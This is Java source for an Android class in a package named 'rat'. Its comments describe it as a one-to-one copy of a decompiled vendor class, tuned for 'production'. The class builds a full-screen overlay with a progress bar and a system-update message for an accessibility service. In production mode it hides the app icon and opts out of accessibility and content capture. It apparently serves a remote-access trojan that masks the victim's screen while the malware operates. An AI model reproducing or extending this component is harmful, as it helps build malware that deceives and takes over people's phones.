package com.vendor.rat.helper;

import android.graphics.Color;
import android.os.Build;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.vendor.rat.service.MyAccessibilityService;

import java.lang.ref.WeakReference;
import java.util.Objects;

/**
 * Vendor: e0.i (内容层) — 一比一复刻 + 生产模式优化
 *
 * 调试模式: 半透明黑色背景 + 应用图标 + 进度条 + 文字
 * 生产模式: 透明背景 (外层负责背景图) + 进度条 + 文字 (无图标)
 *
 * WeakReference f313a 指向进度条 (用于 sendProgress 链路)
 *
 * onLayout: 自定义布局
 *   - 进度条: 垂直居中, 高度20px
 *   - 文字: 居中偏下, 高度200px
 */
public final class BlockOverlayInner extends LinearLayout {

    // vendor: f313a — WeakReference 指向进度条
    public WeakReference<View> f313a;

    /**
     * vendor: e0.i 构造器 (调试模式)
     */
    public BlockOverlayInner(MyAccessibilityService service, String hint) {
        this(service, hint, false);
    }

    /**
     * @param blockingMode true = 生产模式 (透明背景, 无图标), false = 调试模式 (半透明黑+应用图标)
     */
    public BlockOverlayInner(MyAccessibilityService service, String hint, boolean blockingMode) {
        super(service);

        setOrientation(VERTICAL);
        setGravity(17); // CENTER
        setSystemUiVisibility(4); // SYSTEM_UI_FLAG_FULLSCREEN
        setImportantForAccessibility(2); // IMPORTANT_FOR_ACCESSIBILITY_NO
        if (Build.VERSION.SDK_INT >= 30) {
            setImportantForContentCapture(2);
        }

        if (blockingMode) {
            // 生产模式: 透明背景 (外层 BlockOverlayView 负责背景图)
            setBackgroundColor(0x00000000);
        } else {
            // 调试模式: 半透明黑色背景 Color.argb(0.6f, 0, 0, 0)
            setBackgroundColor(Color.argb(153, 0, 0, 0));

            // 调试模式保留应用图标 (方便识别)
            android.widget.ImageView iconView = new android.widget.ImageView(service);
            try {
                android.graphics.drawable.Drawable appIcon = service.getPackageManager()
                    .getApplicationIcon(service.getPackageName());
                if (appIcon != null) {
                    iconView.setImageDrawable(appIcon);
                }
            } catch (Exception ignored) {}
            iconView.setTag("waiting-icon-image");
            addView(iconView);
        }

        // 进度条
        View progressBar = new BlockProgressBar(service);
        progressBar.setTag("waiting-progress-bar");
        addView(progressBar);
        this.f313a = new WeakReference<>(progressBar);

        // 提示文字 (从 config.updateSystemMsg 传入)
        if (hint != null && !hint.isEmpty()) {
            TextView textView = new TextView(service);
            textView.setTag("waiting-hint-text");
            textView.setText(hint);
            textView.setSingleLine(false);
            textView.setTextColor(-1); // white
            textView.setBackgroundColor(0); // transparent
            textView.setTextSize(15.0f);
            textView.setTextAlignment(TEXT_ALIGNMENT_CENTER);
            textView.setGravity(17); // CENTER
            textView.setPadding(0, 10, 0, 10);
            addView(textView);
        }
    }

    /**
     * vendor: e0.i onLayout — 自定义布局
     *
     * 生产模式 (无图标): 进度条居中, 文字居中偏下
     * 调试模式 (有图标): 图标居中偏上, 进度条居中, 文字居中偏下
     */
    @Override
    public final void onLayout(boolean changed, int l, int t, int r, int b) {
        int childCount = getChildCount();
        if (childCount <= 0) return;

        int centerY = ((b - t) / 2) + t;

        for (int i = 0; i < childCount; i++) {
            View child = getChildAt(i);
            Object tag = child.getTag();

            if (Objects.equals(tag, "waiting-icon-image")) {
                // 图标 (仅调试模式): 居中偏上, 宽40%, 高160px
                int totalWidth = r - l;
                int iconWidth = (int) (totalWidth * 0.4f);
                int margin = (totalWidth - iconWidth) / 2;
                int iconTop = centerY - 160 - 10 - 50;
                child.layout(margin, iconTop, r - margin, iconTop + 160);
            } else if (Objects.equals(tag, "waiting-progress-bar")) {
                // 进度条: 垂直居中, 高20px
                int top = centerY - 10;
                child.layout(l, top, r, top + 20);
            } else if (Objects.equals(tag, "waiting-hint-text")) {
                // 文字: 居中偏下, 高200px
                int top = centerY + 10 + 50;
                child.layout(l, top, r, top + 200);
            }
        }
    }
}
